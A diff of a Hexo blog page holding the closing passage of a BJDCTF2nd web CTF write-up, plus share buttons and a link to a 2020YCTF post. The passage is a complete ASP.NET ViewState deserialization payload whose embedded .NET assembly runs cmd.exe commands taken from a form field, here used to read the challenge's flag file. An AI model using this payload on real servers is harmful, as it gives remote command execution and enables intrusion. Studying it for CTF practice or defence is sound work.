+<p>最终payload<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">__EVENTVALIDATION&#x3D;%2FwEdAAIpHaYmmIsjFBcXUoC55PHZsfW5ZCsephGAbk9JEnVl537ojsfDEn9ym48KML9cSm2MmgzC&amp;__VIEWSTATE&#x3D;%2FwEy7EoAAQAAAP%2F%2F%2F%2F8BAAAAAAAAAAwCAAAATlN5c3RlbS5EYXRhLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OQUBAAAAE1N5c3RlbS5EYXRhLkRhdGFTZXQKAAAAFkRhdGFTZXQuUmVtb3RpbmdGb3JtYXQTRGF0YVNldC5EYXRhU2V0TmFtZRFEYXRhU2V0Lk5hbWVzcGFjZQ5EYXRhU2V0LlByZWZpeBVEYXRhU2V0LkNhc2VTZW5zaXRpdmUSRGF0YVNldC5Mb2NhbGVMQ0lEGkRhdGFTZXQuRW5mb3JjZUNvbnN0cmFpbnRzGkRhdGFTZXQuRXh0ZW5kZWRQcm9wZXJ0aWVzFERhdGFTZXQuVGFibGVzLkNvdW50EERhdGFTZXQuVGFibGVzXzAEAQEBAAAAAgAHH1N5c3RlbS5EYXRhLlNlcmlhbGl6YXRpb25Gb3JtYXQCAAAAAQgBCAICAAAABf3%2F%2F%2F8fU3lzdGVtLkRhdGEuU2VyaWFsaXphdGlvbkZvcm1hdAEAAAAHdmFsdWVfXwAIAgAAAAEAAAAGBAAAAAAJBAAAAAkEAAAAAAkEAAAACgEAAAAJBQAAAA8FAAAAfCMAAAIAAQAAAP%2F%2F%2F%2F8BAAAAAAAAAAQBAAAAf1N5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkxpc3RgMVtbU3lzdGVtLk9iamVjdCwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0DAAAABl9pdGVtcwVfc2l6ZQhfdmVyc2lvbgUAAAgICQIAAAAHAAAABwAAABACAAAACAAAAAkDAAAACQQAAAAJBQAAAAkGAAAACQcAAAAJCAAAAAkJAAAACgwKAAAAYVN5c3RlbS5Xb3JrZmxvdy5Db21wb25lbnRNb2RlbCwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPTMxYmYzODU2YWQzNjRlMzUFAwAAAGpTeXN0ZW0uV29ya2Zsb3cuQ29tcG9uZW50TW9kZWwuU2VyaWFsaXphdGlvbi5BY3Rpdml0eVN1cnJvZ2F0ZVNlbGVjdG9yK09iamVjdFN1cnJvZ2F0ZStPYmplY3RTZXJpYWxpemVkUmVmAgAAAAR0eXBlC21lbWJlckRhdGFzAwUfU3lzdGVtLlVuaXR5U2VyaWFsaXphdGlvbkhvbGRlcgoAAAAJCwAAAAkMAAAAAQQAAAADAAAACQ0AAAAJDgAAAAEFAAAAAwAAAAkPAAAACRAAAAABBgAAAAMAAAAJEQAAAAkSAAAAAQcAAAADAAAACRMAAAAJFAAAAAEIAAAAAwAAAAkVAAAACRYAAAAECQAAABxTeXN0ZW0uQ29sbGVjdGlvbnMuSGFzaHRhYmxlBwAAAApMb2FkRmFjdG9yB1ZlcnNpb24IQ29tcGFyZXIQSGFzaENvZGVQcm92aWRlcghIYXNoU2l6ZQRLZXlzBlZhbHVlcwAAAwMABQULCBxTeXN0ZW0uQ29sbGVjdGlvbnMuSUNvbXBhcmVyJFN5c3RlbS5Db2xsZWN0aW9ucy5JSGFzaENvZGVQcm92aWRlcgjsUTg%2FAgAAAAoKAwAAAAkXAAAACRgAAAAECwAAAB9TeXN0ZW0uVW5pdHlTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAREYXRhCVVuaXR5VHlwZQxBc3NlbWJseU5hbWUBAAEIBhkAAAD4AVN5c3RlbS5MaW5xLkVudW1lcmFibGUrV2hlcmVTZWxlY3RMaXN0SXRlcmF0b3JgMltbU3lzdGVtLkJ5dGVbXSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XSxbU3lzdGVtLlJlZmxlY3Rpb24uQXNzZW1ibHksIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dBAAAAAYaAAAATlN5c3RlbS5Db3JlLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4ORAMAAAABwAAAAkbAAAACgkcAAAACR0AAAAICAAAAAAKCAgBAAAAAQ0AAAALAAAABh4AAAD4AVN5c3RlbS5MaW5xLkVudW1lcmFibGUrPFNlbGVjdE1hbnlJdGVyYXRvcj5kX18xN2AyW1tTeXN0ZW0uUmVmbGVjdGlvbi5Bc3NlbWJseSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XSxbU3lzdGVtLlR5cGUsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dBAAAAAkaAAAAEA4AAAAJAAAACAj%2B%2F%2F%2F%2FCggIAQAAAAoJAwAAAAoJIQAAAA0CAQ8AAAALAAAABiIAAADvAVN5c3RlbS5MaW5xLkVudW1lcmFibGUrV2hlcmVTZWxlY3RFbnVtZXJhYmxlSXRlcmF0b3JgMltbU3lzdGVtLlR5cGUsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5PYmplY3QsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dBAAAAAkaAAAAEBAAAAAHAAAACQQAAAAKCSUAAAAKCAgAAAAACggIAQAAAAERAAAACwAAAAYmAAAAKVN5c3RlbS5XZWIuVUkuV2ViQ29udHJvbHMuUGFnZWREYXRhU291cmNlBAAAAAYnAAAATVN5c3RlbS5XZWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iMDNmNWY3ZjExZDUwYTNhEBIAAAAHAAAACQUAAAAICAAAAAAICAoAAAAIAQAIAQAIAQAICAAAAAABEwAAAAsAAAAGKQAAAClTeXN0ZW0uQ29tcG9uZW50TW9kZWwuRGVzaWduLkRlc2lnbmVyVmVyYgQAAAAGKgAAAElTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5EBQAAAAFAAAADQIJKwAAAAgIAwAAAAkIAAAAARUAAAALAAAABi0AAAA0U3lzdGVtLlJ1bnRpbWUuUmVtb3RpbmcuQ2hhbm5lbHMuQWdncmVnYXRlRGljdGlvbmFyeQQAAAAGLgAAAEttc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkQFgAAAAEAAAAJBgAAABAXAAAAAgAAAAkHAAAACQcAAAAQGAAAAAIAAAAGMQAAAAAJMQAAAAQbAAAAf1N5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkxpc3RgMVtbU3lzdGVtLkJ5dGVbXSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0DAAAABl9pdGVtcwVfc2l6ZQhfdmVyc2lvbgMAAA9TeXN0ZW0uQnl0ZVtdW10ICAkyAAAAAQAAAAEAAAAEHAAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAgAAAAhEZWxlZ2F0ZQdtZXRob2QwAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5L1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9uSG9sZGVyCTMAAAAJNAAAAAQdAAAAigFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5MaXN0YDErRW51bWVyYXRvcltbU3lzdGVtLkJ5dGVbXSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0EAAAABGxpc3QFaW5kZXgHdmVyc2lvbgdjdXJyZW50AwAAB39TeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5MaXN0YDFbW1N5c3RlbS5CeXRlW10sIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dCAgCCgAAAAAAAAAACgEhAAAAHAAAAAk1AAAACTYAAAABJQAAABwAAAAJNwAAAAk4AAAAASsAAAADAAAACTkAAAAJOgAAAAcyAAAAAQEAAAAEAAAABwIJOwAAAAoKCgQzAAAAMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQcAAAAEdHlwZQhhc3NlbWJseQZ0YXJnZXQSdGFyZ2V0VHlwZUFzc2VtYmx5DnRhcmdldFR5cGVOYW1lCm1ldGhvZE5hbWUNZGVsZWdhdGVFbnRyeQEBAgEBAQMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5BjwAAADVAVN5c3RlbS5GdW5jYDJbW1N5c3RlbS5CeXRlW10sIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5LCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQkuAAAACgkuAAAABj4AAAAaU3lzdGVtLlJlZmxlY3Rpb24uQXNzZW1ibHkGPwAAAARMb2FkCgQ0AAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9uSG9sZGVyBwAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0dXJlClNpZ25hdHVyZTIKTWVtYmVyVHlwZRBHZW5lcmljQXJndW1lbnRzAQEBAQEAAwgNU3lzdGVtLlR5cGVbXQk%2FAAAACS4AAAAJPgAAAAZCAAAAJ1N5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5IExvYWQoQnl0ZVtdKQZDAAAALlN5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5IExvYWQoU3lzdGVtLkJ5dGVbXSkIAAAACgE1AAAAMwAAAAZEAAAAzAJTeXN0ZW0uRnVuY2AyW1tTeXN0ZW0uUmVmbGVjdGlvbi5Bc3NlbWJseSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XSxbU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuSUVudW1lcmFibGVgMVtbU3lzdGVtLlR5cGUsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQkuAAAACgkuAAAACT4AAAAGRwAAAAhHZXRUeXBlcwoBNgAAADQAAAAJRwAAAAkuAAAACT4AAAAGSgAAABhTeXN0ZW0uVHlwZVtdIEdldFR5cGVzKCkGSwAAABhTeXN0ZW0uVHlwZVtdIEdldFR5cGVzKCkIAAAACgE3AAAAMwAAAAZMAAAAxgFTeXN0ZW0uRnVuY2AyW1tTeXN0ZW0uVHlwZSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XSxbU3lzdGVtLk9iamVjdCwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0JLgAAAAoJLgAAAAZOAAAAEFN5c3RlbS5BY3RpdmF0b3IGTwAAAA5DcmVhdGVJbnN0YW5jZQoBOAAAADQAAAAJTwAAAAkuAAAACU4AAAAGUgAAAClTeXN0ZW0uT2JqZWN0IENyZWF0ZUluc3RhbmNlKFN5c3RlbS5UeXBlKQZTAAAAKVN5c3RlbS5PYmplY3QgQ3JlYXRlSW5zdGFuY2UoU3lzdGVtLlR5cGUpCAAAAAoBOQAAAAsAAAAGVAAAACZTeXN0ZW0uQ29tcG9uZW50TW9kZWwuRGVzaWduLkNvbW1hbmRJRAQAAAAJKgAAABA6AAAAAgAAAAlWAAAACAgAIAAADzsAAAAAEAAAAk1akAADAAAABAAAAP%2F%2FAAC4AAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAAAAOH7oOALQJzSG4AUzNIVRoaXMgcHJvZ3JhbSBjYW5ub3QgYmUgcnVuIGluIERPUyBtb2RlLg0NCiQAAAAAAAAAUEUAAEwBAwDS43ZeAAAAAAAAAADgAAIhCwELAAAIAAAABgAAAAAAAN4mAAAAIAAAAEAAAAAAABAAIAAAAAIAAAQAAAAAAAAABAAAAAAAAAAAgAAAAAIAAAAAAAADAECFAAAQAAAQAAAAABAAABAAAAAAAAAQAAAAAAAAAAAAAACMJgAATwAAAABAAACoAgAAAAAAAAAAAAAAAAAAAAAAAABgAAAMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAgAAAAAAAAAAAAAAAggAABIAAAAAAAAAAAAAAAudGV4dAAAAOQGAAAAIAAAAAgAAAACAAAAAAAAAAAAAAAAAAAgAABgLnJzcmMAAACoAgAAAEAAAAAEAAAACgAAAAAAAAAAAAAAAAAAQAAAQC5yZWxvYwAADAAAAABgAAAAAgAAAA4AAAAAAAAAAAAAAAAAAEAAAEIAAAAAAAAAAAAAAAAAAAAAwCYAAAAAAABIAAAAAgAFADAhAABcBQAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAbMAMAwwAAAAEAABECKAMAAAooBAAACgoGbwUAAApvBgAACgZvBwAACm8IAAAKcwkAAAoLB28KAAAKcgEAAHBvCwAACgZvDAAACm8NAAAKchEAAHBvDgAACgwHbwoAAApyGQAAcAgoDwAACm8QAAAKB28KAAAKF28RAAAKB28KAAAKF28SAAAKB28KAAAKFm8TAAAKB28UAAAKJgdvFQAACm8WAAAKDQZvBwAACglvFwAACt4DJt4ABm8HAAAKbxgAAAoGbwcAAApvGQAACioAARAAAAAAIgCHqQADDgAAAUJTSkIBAAEAAAAAAAwAAAB2NC4wLjMwMzE5AAAAAAUAbAAAALwBAAAjfgAAKAIAAHACAAAjU3RyaW5ncwAAAACYBAAAJAAAACNVUwC8BAAAEAAAACNHVUlEAAAAzAQAAJAAAAAjQmxvYgAAAAAAAAACAAABRxQCAAkAAAAA%2BiUzABYAAAEAAAAOAAAAAgAAAAEAAAAZAAAAAgAAAAEAAAABAAAAAwAAAAAACgABAAAAAAAGACkAIgAGAFYANgAGAHYANgAKAKgAnQAKAMAAnQAKAOgAnQAOABsBCAEOACMBCAEKAE8BnQAOAIYBZwEGAKwBIgAGACECFwIGAEECFwIGAGYCIgAAAAAAAQAAAAAAAQABAAAAEAAXAAAABQABAAEAUCAAAAAAhhgwAAoAAQARADAADgAZADAACgAJADAACgAhALQAHAAhANIAIQApAN0ACgAhAPUAJgAxAAIBCgA5ADAACgA5ADQBKwBBAEIBMAAhAFsBNQBJAJoBOgBRAKMBPwBZALMBRABBALoBMABBAMgBSgBBAOMBSgBBAP0BSgA5ABECTwA5AC4CUwBpAEwCWAAxAFYCMAAxAFwCCgAxAGICCgAuAAsAZQAuABMAbgBcAASAAAAAAAAAAAAAAAAAAAAAAJQAAAAEAAAAAAAAAAAAAAABABkAAAAAAAQAAAAAAAAAAAAAABMAnQAAAAAABAAAAAAAAAAAAAAAAQAiAAAAAAAAAAA8TW9kdWxlPgBkZ3BrNXJsNS5kbGwARQBtc2NvcmxpYgBTeXN0ZW0AT2JqZWN0AC5jdG9yAFN5c3RlbS5SdW50aW1lLkNvbXBpbGVyU2VydmljZXMAQ29tcGlsYXRpb25SZWxheGF0aW9uc0F0dHJpYnV0ZQBSdW50aW1lQ29tcGF0aWJpbGl0eUF0dHJpYnV0ZQBkZ3BrNXJsNQBTeXN0ZW0uV2ViAEh0dHBDb250ZXh0AGdldF9DdXJyZW50AEh0dHBTZXJ2ZXJVdGlsaXR5AGdldF9TZXJ2ZXIAQ2xlYXJFcnJvcgBIdHRwUmVzcG9uc2UAZ2V0X1Jlc3BvbnNlAENsZWFyAFN5c3RlbS5EaWFnbm9zdGljcwBQcm9jZXNzAFByb2Nlc3NTdGFydEluZm8AZ2V0X1N0YXJ0SW5mbwBzZXRfRmlsZU5hbWUASHR0cFJlcXVlc3QAZ2V0X1JlcXVlc3QAU3lzdGVtLkNvbGxlY3Rpb25zLlNwZWNpYWxpemVkAE5hbWVWYWx1ZUNvbGxlY3Rpb24AZ2V0X0Zvcm0AZ2V0X0l0ZW0AU3RyaW5nAENvbmNhdABzZXRfQXJndW1lbnRzAHNldF9SZWRpcmVjdFN0YW5kYXJkT3V0cHV0AHNldF9SZWRpcmVjdFN0YW5kYXJkRXJyb3IAc2V0X1VzZVNoZWxsRXhlY3V0ZQBTdGFydABTeXN0ZW0uSU8AU3RyZWFtUmVhZGVyAGdldF9TdGFuZGFyZE91dHB1dABUZXh0UmVhZGVyAFJlYWRUb0VuZABXcml0ZQBGbHVzaABFbmQARXhjZXB0aW9uAAAPYwBtAGQALgBlAHgAZQAAB2MAbQBkAAAHLwBjACAAAAAAAFPrEJ4OwFZKu3aYOkFG4%2FoACLd6XFYZNOCJAyAAAQQgAQEICLA%2FX38R1Qo6BAAAEhEEIAASFQQgABIZBCAAEiEEIAEBDgQgABIlBCAAEikEIAEODgUAAg4ODgQgAQECAyAAAgQgABIxAyAADggHBBIREh0ODggBAAgAAAAAAB4BAAEAVAIWV3JhcE5vbkV4Y2VwdGlvblRocm93cwEAAAC0JgAAAAAAAAAAAADOJgAAACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwCYAAAAAAAAAAAAAAABfQ29yRGxsTWFpbgBtc2NvcmVlLmRsbAAAAAAA%2FyUAIAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAEAAAABgAAIAAAAAAAAAAAAAAAAAAAAEAAQAAADAAAIAAAAAAAAAAAAAAAAAAAAEAAAAAAEgAAABYQAAATAIAAAAAAAAAAAAATAI0AAAAVgBTAF8AVgBFAFIAUwBJAE8ATgBfAEkATgBGAE8AAAAAAL0E7%2F4AAAEAAAAAAAAAAAAAAAAAAAAAAD8AAAAAAAAABAAAAAIAAAAAAAAAAAAAAAAAAABEAAAAAQBWAGEAcgBGAGkAbABlAEkAbgBmAG8AAAAAACQABAAAAFQAcgBhAG4AcwBsAGEAdABpAG8AbgAAAAAAAACwBKwBAAABAFMAdAByAGkAbgBnAEYAaQBsAGUASQBuAGYAbwAAAIgBAAABADAAMAAwADAAMAA0AGIAMAAAACwAAgABAEYAaQBsAGUARABlAHMAYwByAGkAcAB0AGkAbwBuAAAAAAAgAAAAMAAIAAEARgBpAGwAZQBWAGUAcgBzAGkAbwBuAAAAAAAwAC4AMAAuADAALgAwAAAAPAANAAEASQBuAHQAZQByAG4AYQBsAE4AYQBtAGUAAABkAGcAcABrADUAcgBsADUALgBkAGwAbAAAAAAAKAACAAEATABlAGcAYQBsAEMAbwBwAHkAcgBpAGcAaAB0AAAAIAAAAEQADQABAE8AcgBpAGcAaQBuAGEAbABGAGkAbABlAG4AYQBtAGUAAABkAGcAcABrADUAcgBsADUALgBkAGwAbAAAAAAANAAIAAEAUAByAG8AZAB1AGMAdABWAGUAcgBzAGkAbwBuAAAAMAAuADAALgAwAC4AMAAAADgACAABAEEAcwBzAGUAbQBiAGwAeQAgAFYAZQByAHMAaQBvAG4AAAAwAC4AMAAuADAALgAwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAwAAADgNgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEVgAAAAtTeXN0ZW0uR3VpZAsAAAACX2ECX2ICX2MCX2QCX2UCX2YCX2cCX2gCX2kCX2oCX2sAAAAAAAAAAAAAAAgHBwICAgICAgICExPSdO4q0RGL%2BwCgyQ8m9wsLLV6mOis34N3%2FOpgYOnebs0UrRhI%3D&amp;__VIEWSTATEGENERATOR&#x3D;CA0B0334&amp;button1&#x3D;Click+me!&amp;cmd&#x3D;type c:\Fl@g_glzjin_still_w@nts_a_girl_friend.txt</span><br></pre></td></tr></table></figure></p>
 
     
 
+    
+
+    
+    <div class="declare"> 
+      <ul class="post-copyright">
+        <li>
+          <strong>本文作者：</strong>
+          BL
+        </li>
+        <li>
+          <strong>本文链接：</strong>
+          <a href="https://passbl.gitee.io/blog/blog/2020/05/25/BJDCTF2nd-web-WP/" title="BJDCTF2nd" target="_blank">https://passbl.gitee.io/blog/blog/2020/05/25/BJDCTF2nd-web-WP/</a>
+        </li>
+        
+        <li>
+          <strong>版权声明： </strong>
+          
+          本博客所有文章除特别声明外，均采用 <a href="https://github.com/JoeyBling/hexo-theme-yilia-plus/blob/master/LICENSE" rel="external nofollow" target="_blank">MIT</a> 许可协议。转载请注明出处！
+        </li>
+        
+      </ul>
+    </div>
     
 
   </div>
@@ -281,16 +429,76 @@
     
 
     
-    <p class="article-more-link">
-      <a class="article-more-a" href="/blog/2020/05/25/BJDCTF2nd-web-WP/">展开全文 >></a>
-    </p>
+
     
+    
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <!-- <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a> -->
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
+        </div>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+     <!-- <img src="//pan.baidu.com/share/qrcode?url=https://passbl.gitee.io/blog/2020/05/25/BJDCTF2nd-web-WP/" alt="微信分享二维码"> -->
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
 
     
     <div class="clearfix"></div>
   </div>
   </div>
 </article>
+
+
+<nav id="article-nav">
+  
+  
+    <a href="/blog/2020/05/25/2020YCTF-web-WP/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">2020YCTF</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
 
 <aside class="wrap-side-operation">
     <div class="mod-side-operation">
@@ -305,176 +513,64 @@
         </div>
         
         
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-2020YCTF-web-WP" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-  
-  
-    <h1 itemprop="name">
-	
-	  <a class="article-title" href="/blog/2020/05/25/2020YCTF-web-WP/" target="_blank">2020YCTF</a>
-  
-    </h1>
-  
-
-
-  
-  
-<a href="/blog/2020/05/25/2020YCTF-web-WP/" class="archive-article-date">
-        <time datetime="2020-05-25T09:35:04.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-05-25</time>
-</a>
-
-  
-  
-    
-
-  
-  </header>
-  
-  <div class="article-entry" itemprop="articleBody">
-    
-    <h2 id="web-WP"><a href="#web-WP" class="headerlink" title="web WP"></a>web WP</h2>
-    
-    <a class="article-more-a" href="/blog/2020/05/25/2020YCTF-web-WP/#more">more >></a>
-    
-    
-
-    
-
-    
-
-  </div>
-  <div class="article-info article-info-index">
-    
-    
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">CTF</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-    
-
-    
-    <p class="article-more-link">
